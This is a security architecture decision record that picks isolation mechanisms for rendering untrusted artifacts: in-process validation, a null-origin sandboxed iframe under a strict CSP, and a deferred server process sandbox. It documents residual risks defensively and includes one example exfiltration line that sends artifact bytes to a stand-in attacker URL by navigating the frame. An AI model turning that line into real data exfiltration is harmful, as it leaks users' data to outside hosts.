<!-- SPDX-License-Identifier: FSL-1.1-Apache-2.0 -->
<!-- Copyright (c) 2025 Open Computer Use Contributors -->

---
status: accepted
last-reviewed: 2026-08-12
owner: "@Wide-Moat/architects"
applies-to: next/v1
supersedes: []
superseded-by: null
amends: ['0015-storage-decomposition-by-trust-plane.md']
compliance-impact: [SOC2-CC6.1, SOC2-CC6.6, ISO27001-A.8.26]
license-impact: none
threat-mitigation-link: ../06-threat-model.md
---

The isolation substrate for reading an untrusted artifact body is chosen per render location, not as one mechanism — for anyone wiring preview-render or editing the parser-sandbox boundary (component-08 render, component-04 ingest).

# ADR-0026: Parser-sandbox substrate, keyed on render location

## Status

`accepted` — amends [ADR-0015](0015-storage-decomposition-by-trust-plane.md), resolves its Open Question 1 and [component-08](../components/08-web-ui.md) Open Question 1.

## Context

[ADR-0015](0015-storage-decomposition-by-trust-plane.md) pinned the parser-sandbox as a capability-free plane — no signer, no key, never co-resident with the session-minting authority — fronting untrusted artifact bodies (preview-render, archive ingest), and deferred the *substrate* (process boundary versus in-language capability confinement) to [#218](https://github.com/Wide-Moat/open-computer-use/issues/218). The boundary's existence is canon; only its mechanism is open.

The deciding fact is what the Web UI renders today: nothing untrusted. `previewRender` is a gated-off stub, the SPA preview affordance is hidden, and the runtime dependency closure carries no render, parse, or sanitize library — the content byte path serves `Content-Disposition: inline` by resolved MIME and delegates decode to the browser. The only untrusted-body code that ships is the in-language ingest validator (magic-byte classify over a bounded prefix; archive validation over entry metadata that never inflates), already capability-free under three independent guards (a dependency-graph rule, a lint import-restriction, and an absence test with a recorded red-to-green proof). So the server holds zero full-body-parser attack surface, and a process sandbox built now would isolate a capability that does not exist.

The latent surface is concentrated in two formats a future preview could wire — SVG and OOXML (XLSX/DOCX) — across four vectors: external-entity expansion (XXE), server-side request forgery from body-named URLs (SSRF), entity-expansion denial of service, and active content (script in SVG or HTML). These are the threat rows P4-artifact-I3 and P4-artifact-E3; none is live, each must be closed before its format is ever rendered.

## Decision

We will select the parser-sandbox substrate by **render location**, because the location decides where the untrusted body actually executes — and pin a trigger that re-opens the choice when that location changes.

- **Ingest — in-language capability confinement.** The lexical validator stays server-side and in-process. It holds no signer, no key, no network capability, and reads only bounded metadata; the co-residency ADR-0015 names is already closed in-language and proven by the three-guard harness. A process fork adds an operational substrate for no blast-radius gain, so we do not fork it.
- **Body render — the browser.** Preview render runs in the browser, in a null-origin sandboxed iframe: a `sandbox` attribute carrying `allow-scripts` and **never** `allow-same-origin`. This is a distinct, stricter directive class from the SPA's `frame-ancestors` policy, which governs who frames the SPA, not what an artifact body may do. A null-origin frame cannot reach the embedder's origin, so it also closes the `postMessage` exfil leg without setting COOP — provided the SPA's `message` listener rejects `event.origin === "null"`, which is what such a frame posts. That check was incidental when nothing ran in the frame; it is load-bearing now that a renderer does.

  Two documents with two policies meet in that frame, and conflating them is the mistake to avoid. The **artifact body**, served from the content route, keeps `default-src 'none'; script-src 'none'; object-src 'none'` — those bytes stay inert wherever they land. The **renderer document** is our own asset, served same-origin into the frame, and it carries the egress block NFR-SEC-86 requires: `default-src 'none'` with a self-only `script-src`/`style-src`, and no `connect-src`, `img-src`, `media-src`, `font-src`, `prefetch-src` or `frame-src`. `default-src 'none'` is the load-bearing half for that class — each of those falls back to it, as do `worker-src`, `child-src`, `manifest-src` and `object-src`, so a permissive fallback would silently re-open every one. The document directives do NOT fall back and are therefore named outright: `base-uri 'none'` and `form-action 'none'`. Leaving `base-uri` to the fallback is the easy mistake — it does not inherit, and an unset one lets renderer script plant a `<base href>` that re-points every relative URL built afterwards at an attacker. The sandbox token list is exactly `allow-scripts`: no `allow-popups`, no `allow-top-navigation`, no `allow-downloads`, no `allow-forms`, no `allow-modals`.

  That block is a policy now, where it used to be a structural fact. A script-free frame could not fetch because nothing ran in it; a frame that runs a renderer cannot fetch because its own document policy forbids every fetching directive. Denying `connect-src` alone would not do it — an image beacon, `sendBeacon`, a form post and a `window.open` are each an exfiltration path under a different directive, which is why the block is stated as a closed allowlist rather than a list of denials. Sandbox omits `allow-popups` and `allow-top-navigation` for the same reason.

  `allow-scripts` is what buys format coverage. A frame that runs no script renders only what the browser renders natively — an image, a PDF in the native viewer, media, plain text — and no amount of policy work makes a markdown, spreadsheet, or office renderer appear in it. The isolation that matters is the opaque origin, which is unchanged: no cookie, no storage, no reach into the embedder, no named origin to `postMessage` at.
- **Server-side heavy parser — process boundary, deferred behind a trigger.** Adopting any server-side full-body parser or rasterizer (a Node PDF renderer, a spreadsheet library, a headless office converter) flips the substrate to a separate OS process with a seccomp-bpf syscall filter, no network namespace, a memory and CPU cgroup, a non-root user, and a read-only rootfs. That adoption is itself a load-bearing decision and requires its own ADR; until a heavy parser is introduced, this tier is not built.

The boundary property (no signer, no key, no co-residency with the session-minter) is unchanged. This ADR decides only the substrate per location.

## Consequences

- Preview render, when wired in component-08, is a browser-CSP task, not a server-sandbox build: active content (SVG `<script>`, HTML inline JS) defaults to `attachment` disposition.
- What `allow-scripts` concedes, stated plainly: a renderer bug is now reachable by a hostile artifact. A crafted PDF or spreadsheet that defeats its parser executes in the opaque origin — it reads that artifact's own bytes, which the user opened deliberately, and it can burn CPU or memory in the frame. It cannot read a cookie, a token, another artifact, or anything in the embedder.
- The block closes fetch-class exfiltration, not navigation-class. Script in the frame can still navigate its OWN document — `location = 'https://attacker/?' + bytes` is an outbound GET that no fetch directive intercepts, and `allow-top-navigation` governs the top window rather than the frame's own. `navigate-to` would close it and is not portably supported. So the honest statement is narrower than "cannot phone home": a hostile renderer cannot fetch, but it can walk its own frame out carrying what it read. The blast radius is the same as the renderer-CVE residual above — the artifact's own bytes, which the user opened — and it is stated here rather than left for a reader to discover.
- NFR-SEC-86's browser leg changes mechanism and must be re-evidenced. That NFR calls the egress block *structural* — a frame under `default-src 'none'` "cannot fetch" — which was true only because no script ran. The property still holds, but it now rests on the renderer document's own policy, so the check that proves it moves with it: a fixture asserting the RENDERER document's CSP carries no fetching directive, not the artifact body's. A test still pointed at the body would pass while proving nothing about the code that now executes.
- The server keeps zero render-dependency CVE surface for as long as render stays browser-native; the trigger makes that a conscious, ADR-gated step rather than a silent dependency creep.
- Four hardening requirements land as NFR-SEC extensions (XXE-off default; renderer egress-block; entity-expansion limits; active-content disposition), each with a falsifiable CI check, mapped to P4-artifact-I3/E3. They gate the *first* render of a format, not running code.
- A future heavy-parser ADR inherits a clean precondition: the boundary property and the three hardening NFRs already hold, so it adds only the process substrate.

## Alternatives

- **Process boundary now (for ingest and a presumed future render).** Rejected: it isolates a server-side full-body parser that does not exist, so it mocks a need; it adds an operational substrate (process lifecycle, IPC, resource accounting) for zero current blast-radius reduction. The trigger captures the case where it does become load-bearing.
- **In-language confinement for body render too (sanitizer-only, e.g. a DOMPurify pass in the SPA origin).** Rejected as the boundary: a sanitizer is a denylist running in the SPA's own origin, so a bypass executes with SPA privileges. A null-origin sandboxed iframe is an allowlist boundary the sanitizer can complement but not replace.
- **A script-free frame (`sandbox` with neither `allow-scripts` nor `allow-same-origin`).** This ADR's original position, superseded here. Rejected on coverage: a frame that runs no script renders only browser-native formats — image, PDF, media, plain text, static HTML — which is roughly half the formats component-08 must show, and no policy change adds the other half. Markdown, spreadsheets, and the office formats each need a parser, and a parser needs an execution context. The choice was never "scripts or no scripts" but "scripts in an opaque origin, or scripts in ours": the SPA-origin alternative below is strictly worse, and the deferred server tier costs a process substrate we have no other reason to build.
- **One substrate for all three tiers.** Rejected: ingest, browser render, and a server rasterizer have different execution locations and different blast radii; a single mechanism either over-builds the cheap tiers or under-isolates the heavy one.
